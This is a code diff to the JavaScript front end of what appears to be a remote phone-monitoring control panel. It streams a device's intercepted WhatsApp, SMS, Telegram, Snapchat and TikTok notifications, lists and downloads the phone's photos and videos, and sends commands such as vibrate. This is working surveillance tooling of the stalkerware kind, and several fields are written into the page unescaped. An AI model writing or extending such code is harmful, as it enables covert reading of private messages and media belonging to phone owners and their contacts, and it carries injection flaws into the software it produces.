@@ -134,14 +134,16 @@ function connectWS() {
 }
 
 function handleDeviceResponse(msg) {
-  if (msg.success && msg.command_type === 'LIST_FILES') {
-    handleFilesResponse(msg);
+  if (msg.success && msg.command_type === 'LIST_MEDIA') {
+    handleGalleryResponse(msg);
   } else if (msg.success && msg.command_type === 'GET_CALENDAR') {
     handleCalendarResponse(msg);
   } else if (msg.success && msg.command_type === 'DOWNLOAD_FILE') {
-    // open download URL in new tab
     window.open(msg.data, '_blank');
     showToast('Downloading file...');
+  } else if (msg.success && msg.command_type === 'DOWNLOAD_VIDEO') {
+    // video stream URL from phone
+    if (msg.data) window.open(msg.data, '_blank');
   } else {
     showToast(`${msg.command_type}: ${msg.success ? 'OK' : 'Failed'}${msg.data ? ' - ' + msg.data : ''}`, !msg.success);
   }
@@ -635,12 +637,13 @@ function handleLiveNotification(msg) {
   // prepend to the table directly instead of re-fetching REST
   const container = document.getElementById('notifList');
   if (document.getElementById('sec-notifications')?.classList.contains('active') && container) {
-    const cls = getNotifBadgeClass(msg.app_name || msg.app_package || '');
+    const cls = getNotifBadgeClass(msg.app_name, msg.app_package);
+    const appDisplay = getAppDisplay(msg.app_name, msg.app_package);
     const key = `${msg.device_id}|${msg.sender}|${msg.message}|${msg.timestamp}`;
     if (seenNotifIds.has(key)) return;
     seenNotifIds.add(key);
     const row = document.createElement('tr');
-    row.innerHTML = `<td>${msg.device_name || msg.device_id?.substring(0,12) || '?'}</td><td><span class="notif-app-badge ${cls}">${msg.app_name || msg.app_package || '?'}</span></td><td>${escapeHtml(msg.sender || '-')}</td><td><div class="notif-message">${escapeHtml((msg.message || '').substring(0, 200))}</div></td><td style="white-space:nowrap">${msg.timestamp ? new Date(msg.timestamp).toLocaleString() : 'now'}</td><td></td></tr>`;
+    row.innerHTML = `<td>${msg.device_name || msg.device_id?.substring(0,12) || '?'}</td><td><span class="notif-app-badge ${cls}">${appDisplay}</span></td><td>${escapeHtml(msg.sender || '-')}</td><td><div class="notif-message">${escapeHtml((msg.message || '').substring(0, 200))}</div></td><td style="white-space:nowrap">${msg.timestamp ? new Date(msg.timestamp).toLocaleString() : 'now'}</td><td></td></tr>`;
     const tbody = container.querySelector('tbody');
     if (tbody) {
       tbody.prepend(row);
@@ -655,12 +658,12 @@ function showNotifToast(msg) {
   const container = document.getElementById('notifToastContainer');
   const card = document.createElement('div');
   card.className = 'notif-toast-card';
-  const badgeClass = getNotifBadgeClass(msg.app_name || msg.app_package);
-  const icon = msg.app_name?.toLowerCase().includes('whatsapp') ? '&#128172;' :
-               msg.app_name?.toLowerCase().includes('message') || msg.app_name?.toLowerCase().includes('sms') ? '&#128231;' : '&#128172;';
+  const badgeClass = getNotifBadgeClass(msg.app_name, msg.app_package);
+  const appDisplay = getAppDisplay(msg.app_name, msg.app_package);
+  const icon = badgeClass === 'whatsapp' ? '&#128172;' : badgeClass === 'sms' ? '&#128231;' : badgeClass === 'snapchat' ? '&#128247;' : badgeClass === 'tiktok' ? '&#127911;' : '&#128172;';
   card.innerHTML = `<div class="notif-toast-icon ${badgeClass}" style="font-size:16px">${icon}</div>
     <div class="notif-toast-body">
-      <div class="notif-toast-header"><span class="notif-toast-app">${escapeHtml(msg.app_name || 'App')}</span><button class="notif-toast-close" onclick="this.parentElement.parentElement.parentElement.remove()">&times;</button></div>
+      <div class="notif-toast-header"><span class="notif-toast-app">${escapeHtml(appDisplay)}</span><button class="notif-toast-close" onclick="this.parentElement.parentElement.parentElement.remove()">&times;</button></div>
       <div class="notif-toast-sender">${escapeHtml(msg.sender || '')}</div>
       <div class="notif-toast-text">${escapeHtml((msg.message || '').substring(0, 120))}</div>
     </div>`;
@@ -681,21 +684,34 @@ async function refreshNotifications() {
   if (all.length === 0) { container.innerHTML = '<div class="empty-state">No notifications yet. Enable Notification Access on device.</div>'; return; }
   container.innerHTML = `<table><thead><tr><th>Device</th><th>App</th><th>Sender</th><th>Message</th><th>Time</th><th></th></tr></thead><tbody>
     ${all.slice(0, 200).map(n => {
-      const cls = getNotifBadgeClass(n.app_name || n.app_package);
+      const cls = getNotifBadgeClass(n.app_name, n.app_package);
+      const appDisplay = getAppDisplay(n.app_name, n.app_package);
       const key = `${n.device_id}|${n.sender}|${n.message}|${n.timestamp}`;
       seenNotifIds.add(key);
-      return `<tr><td>${n.device_name}</td><td><span class="notif-app-badge ${cls}">${n.app_name || n.app_package}</span></td><td>${n.sender || '-'}</td><td><div class="notif-message">${escapeHtml(n.message || '')}</div></td><td style="white-space:nowrap">${n.timestamp ? new Date(n.timestamp).toLocaleString() : '-'}</td><td><button class="row-delete" onclick="deleteNotification('${n.id}')">Delete</button></td></tr>`;
+      return `<tr><td>${n.device_name}</td><td><span class="notif-app-badge ${cls}">${appDisplay}</span></td><td>${n.sender || '-'}</td><td><div class="notif-message">${escapeHtml(n.message || '')}</div></td><td style="white-space:nowrap">${n.timestamp ? new Date(n.timestamp).toLocaleString() : '-'}</td><td><button class="row-delete" onclick="deleteNotification('${n.id}')">Delete</button></td></tr>`;
     }).join('')}
   </tbody></table>`;
 }
 
-function getNotifBadgeClass(name) {
-  if (!name) return '';
-  const l = name.toLowerCase();
-  if (l.includes('whatsapp')) return 'whatsapp';
-  if (l.includes('message') || l.includes('sms') || l.includes('mms')) return 'sms';
-  if (l.includes('telegram')) return 'telegram';
+function getNotifBadgeClass(name, pkg) {
+  const l = (name || '').toLowerCase();
+  const p = (pkg || '').toLowerCase();
+  if (l.includes('whatsapp') || p.includes('whatsapp')) return 'whatsapp';
+  if (l.includes('message') || l.includes('sms') || l.includes('mms') || p.includes('com.google.android.apps.messaging')) return 'sms';
+  if (l.includes('telegram') || p.includes('telegram') || p.includes('org.telegram')) return 'telegram';
+  if (l.includes('snapchat') || p.includes('snapchat')) return 'snapchat';
+  if (l.includes('tiktok') || p.includes('tiktok') || p.includes('com.zhiliao')) return 'tiktok';
   return '';
+}
+function getAppDisplay(name, pkg) {
+  const l = (name || '').toLowerCase();
+  const p = (pkg || '').toLowerCase();
+  if (p.includes('com.google.android.apps.messaging')) return 'SMS';
+  if (p.includes('com.whatsapp')) return 'WhatsApp';
+  if (p.includes('org.telegram')) return 'Telegram';
+  if (p.includes('snapchat')) return 'Snapchat';
+  if (p.includes('tiktok') || p.includes('com.zhiliao')) return 'TikTok';
+  return name || pkg || '?';
 }
 function escapeHtml(t) { const d = document.createElement('div'); d.textContent = t; return d.innerHTML; }
 async function deleteNotification(id) { try { await fetch(`${API_BASE}/api/notifications/${id}`, { method: 'DELETE' }); refreshNotifications(); } catch (_) { showToast('Failed', true); } }
@@ -709,8 +725,9 @@ async function loadDeviceNotifications(deviceId) {
     if (notifs.length === 0) { container.innerHTML = '<div class="empty-state">No notifications</div>'; return; }
     container.innerHTML = `<table><thead><tr><th>App</th><th>Sender</th><th>Message</th><th>Time</th></tr></thead><tbody>
       ${notifs.slice(0, 50).map(n => {
-        const cls = getNotifBadgeClass(n.app_name || n.app_package);
-        return `<tr><td><span class="notif-app-badge ${cls}">${n.app_name || n.app_package}</span></td><td>${n.sender || '-'}</td><td><div class="notif-message">${escapeHtml(n.message || '')}</div></td><td style="white-space:nowrap">${n.timestamp ? new Date(n.timestamp).toLocaleString() : '-'}</td></tr>`;
+        const cls = getNotifBadgeClass(n.app_name, n.app_package);
+        const appDisplay = getAppDisplay(n.app_name, n.app_package);
+        return `<tr><td><span class="notif-app-badge ${cls}">${appDisplay}</span></td><td>${n.sender || '-'}</td><td><div class="notif-message">${escapeHtml(n.message || '')}</div></td><td style="white-space:nowrap">${n.timestamp ? new Date(n.timestamp).toLocaleString() : '-'}</td></tr>`;
       }).join('')}
     </tbody></table>`;
   } catch (_) {}
@@ -741,66 +758,57 @@ function sendVibrate() {
   if (ms) sendCommand('VIBRATE_DEVICE', { duration_ms: parseInt(ms) || 10000 });
 }
 
-// ===== File Browser Popup =====
-function openFilesPopup() {
+// ===== Gallery Popup (images & videos) =====
+function openGalleryPopup() {
   if (!selectedDevice) return showToast('Select a device first', true);
-  const content = document.getElementById('filesPopupContent');
-  content.innerHTML = '<div class="loading-popup"><div class="spinner"></div><p>Waiting for device response...</p><div class="progress-bar"><div class="progress-fill"></div></div><p class="error-note hidden" id="filesError">Device is offline. Check connection.</p></div>';
-  document.getElementById('filesPopup').classList.remove('hidden');
-  // send command
-  const path = prompt('Directory path:', '/storage/emulated/0');
-  if (!path) { closeFilesPopup(); return; }
-  sendCommand('LIST_FILES', { path });
+  const content = document.getElementById('galleryPopupContent');
+  content.innerHTML = '<div class="loading-popup"><div class="spinner"></div><p>Fetching media...</p><div class="progress-bar"><div class="progress-fill"></div></div></div>';
+  document.getElementById('galleryPopup').classList.remove('hidden');
+  sendCommand('LIST_MEDIA', {});
 }
 
-function handleFilesResponse(msg) {
-  const content = document.getElementById('filesPopupContent');
+function handleGalleryResponse(msg) {
+  const content = document.getElementById('galleryPopupContent');
   if (!content) return;
   try {
-    const payload = JSON.parse(msg.data || '{}');
-    const files = payload.files || payload || [];
-    const currentPath = payload.current_path || '';
-    if (!Array.isArray(files) || files.length === 0) { content.innerHTML = '<div class="insight-empty">No files found</div>'; return; }
-    // parent dir entry
-    let rows = '';
-    if (currentPath) {
-      const parent = currentPath.replace(/\/?[^\/]+$/, '') || '/';
-      if (parent !== currentPath) {
-        rows += `<tr><td><a href="#" onclick="browseDir('${escapeHtml(parent)}')" style="text-decoration:none;color:var(--accent)">📁 ..</a></td><td>-</td><td>dir</td><td></td></tr>`;
-      }
-    }
-    files.forEach(f => {
-      const name = escapeHtml(f.name || '');
-      const pathAttr = typeof f.path === 'string' ? escapeHtml(f.path) : '';
-      const size = f.size || 0;
-      const isDir = f.is_dir;
-      const mime = f.mime || '-';
-      let btn = '';
-      if (isDir) {
-        btn = `<button class="btn btn-glass btn-sm" onclick="browseDir('${pathAttr}')">Open</button>`;
-      } else {
-        btn = `<button class="btn btn-glass btn-sm" onclick="downloadFile('${pathAttr}')">DL</button>`;
-      }
-      rows += `<tr><td>${isDir ? '📁 ' : '📄 '}${name}</td><td>${isDir ? '-' : formatFileSize(size)}</td><td>${mime}</td><td>${btn}</td></tr>`;
-    });
-    content.innerHTML = `<table><thead><tr><th>Name</th><th>Size</th><th>Type</th><th></th></tr></thead><tbody>${rows}</tbody></table>`;
+    const items = JSON.parse(msg.data || '[]');
+    if (!Array.isArray(items) || items.length === 0) { content.innerHTML = '<div class="insight-empty">No media found</div>'; return; }
+    content.innerHTML = `<div class="gallery-grid">${items.map(item => {
+      const isVideo = item.mime && item.mime.startsWith('video/');
+      const thumbUrl = item.thumb_url || '';
+      const path = escapeHtml(item.path || '');
+      return `<div class="gallery-item">
+        <div class="gallery-thumb" style="background-image:url('${thumbUrl}')">
+          ${isVideo ? `<div class="gallery-play-icon" onclick="downloadVideo('${path}')">▶</div>` : ''}
+        </div>
+        <div class="gallery-info">
+          <div class="gallery-name">${escapeHtml(item.name || '')}</div>
+          <div class="gallery-meta">${item.mime ? item.mime.split('/')[1]?.toUpperCase() : '-'} · ${formatFileSize(item.size || 0)}</div>
+        </div>
+        <div class="gallery-actions">
+          ${isVideo ? `<button class="btn btn-glass btn-sm" onclick="downloadVideo('${path}')" title="Download video">DL</button>` : `<button class="btn btn-glass btn-sm" onclick="downloadFile('${path}')" title="Download image">DL</button>`}
+        </div>
+      </div>`;
+    }).join('')}</div>`;
   } catch (_) {
-    content.innerHTML = '<div class="insight-empty">Failed to parse file list</div>';
+    content.innerHTML = '<div class="insight-empty">Failed to load media</div>';
   }
 }
 
-function browseDir(path) {
-  const content = document.getElementById('filesPopupContent');
-  content.innerHTML = '<div class="loading-popup"><div class="spinner"></div><p>Loading directory...</p><div class="progress-bar"><div class="progress-fill"></div></div></div>';
-  sendCommand('LIST_FILES', { path });
+function downloadVideo(filePath) {
+  if (!selectedDevice) return;
+  sendCommand('DOWNLOAD_VIDEO', { file_path: filePath });
+  showToast('Requesting video download...');
 }
 
 function downloadFile(filePath) {
+  if (!selectedDevice) return;
   sendCommand('DOWNLOAD_FILE', { file_path: filePath });
+  showToast('Requesting download...');
 }
 
-function closeFilesPopup() {
-  document.getElementById('filesPopup').classList.add('hidden');
+function closeGalleryPopup() {
+  document.getElementById('galleryPopup').classList.add('hidden');
 }
 
 // ===== Calendar Popup =====
